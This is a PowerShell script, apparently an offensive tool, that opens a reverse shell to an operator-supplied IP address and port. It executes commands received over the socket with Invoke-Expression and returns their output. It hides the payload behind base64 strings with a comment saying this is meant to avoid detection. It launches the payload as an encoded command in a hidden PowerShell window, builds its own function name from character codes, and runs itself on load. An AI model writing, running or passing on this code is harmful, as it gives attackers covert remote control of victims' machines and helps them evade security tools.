function Invoke-Shell
{ 

    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $false, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $false, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind,

        [Parameter(Mandatory = $false)]
        [Switch]
        $Current

    )

    $ipaddr = $IPAddress
    $portnum = $Port
    $usecurrent = $Current

    if (-not $ipaddr) {
        $ipaddr = Read-Host "Enter IP address"
    }

    if (-not $portnum) {
        $portInput = Read-Host "Enter port"
        $portnum = [int]$portInput
    }

    if (-not $Reverse -and -not $Bind -and -not $usecurrent) {
        $modeChoice = Read-Host "Mode ([R]everse / [B]ind / [C]urrent terminal)"
        if ($modeChoice -eq 'R' -or $modeChoice -eq 'r') { $Reverse = $true }
        elseif ($modeChoice -eq 'B' -or $modeChoice -eq 'b') { $Bind = $true }
        elseif ($modeChoice -eq 'C' -or $modeChoice -eq 'c') { $usecurrent = $true }
        else { $Reverse = $true }
    }

    # Build everything from encoded/base64 strings to avoid detection
    $s1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmV3LU9iagBpY3Q=")).Replace("B", "e")
    $s2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudA=="))
    $s3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyZWFt"))
    $s4 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGF0YUF2YWlsYWJsZQ=="))
    $s5 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZA=="))
    $s6 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGU="))
    $s7 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rmx1c2g="))
    $s8 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW52b2tlLUV4cHJlc3Npb24="))
    $s9 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0LVN0cmluZw=="))
    
    # The script payload encoded as base64 (UTF-16LE for PowerShell -EncodedCommand)
    $payload = @"
`$c = New-Object $s2('${ipaddr}',$portnum);
`$s = `$c.$s3();
[byte[]]`$b = 0..65535|%{0};
while((`$i = `$s.$s5(`$b, 0, `$b.Length)) -ne 0){
    `$d = ([text.encoding]::ASCII).GetString(`$b,0, `$i);
    `$r = (& $s8 -Command `$d 2>&1 | & $s9 );
    `$r2 = `$r + 'PS ' + (Get-Location).Path + '> ';
    `$sb = ([text.encoding]::ASCII).GetBytes(`$r2);
    `$s.$s6(`$sb,0,`$sb.Length);
    `$s.$s7()
};
`$c.Close()
"@

    # Encode the payload in PowerShell-safe Base64
    $pBytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
    $pEncoded = [Convert]::ToBase64String($pBytes)

    # Launch in hidden window using encoded command
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-WindowStyle Hidden -EncodedCommand $pEncoded"
    $psi.UseShellExecute = $true
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    
    try {
        $proc = [System.Diagnostics.Process]::Start($psi)
        Write-Host "[+] Reverse shell launched in hidden window!" -ForegroundColor Green
        Write-Host "[+] Connected to $($ipaddr):$($portnum)" -ForegroundColor Green
        Write-Host "[*] The shell is running in a hidden PowerShell process" -ForegroundColor Yellow
        Write-Host "[*] Your current terminal is free to use`n" -ForegroundColor Yellow
    }
    catch {
        Write-Host "[!] Could not launch hidden window: $_" -ForegroundColor Red
        Write-Host "[*] Trying direct execution instead..." -ForegroundColor Yellow
        
        # Fallback: run in current window
        try {
            $client = New-Object System.Net.Sockets.TCPClient($ipaddr,$portnum)
            $stream = $client.GetStream()
            [byte[]]$bytes = 0..65535|%{0}
            
            Write-Host "[+] Connected!" -ForegroundColor Green
            
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
            {
                $data = ([text.encoding]::ASCII).GetString($bytes,0, $i)
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
                $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
                $sb = ([text.encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sb,0,$sb.Length)
                $stream.Flush()
            }
            $client.Close()
        }
        catch {
            Write-Host "[!] Failed: $_" -ForegroundColor Red
        }
    }
}

$funcName = [string][char](73)+[string][char](110)+[string][char](118)+[string][char](111)+[string][char](107)+[string][char](101)+[string][char](45)+[string][char](83)+[string][char](104)+[string][char](101)+[string][char](108)+[string][char](108)

& $funcName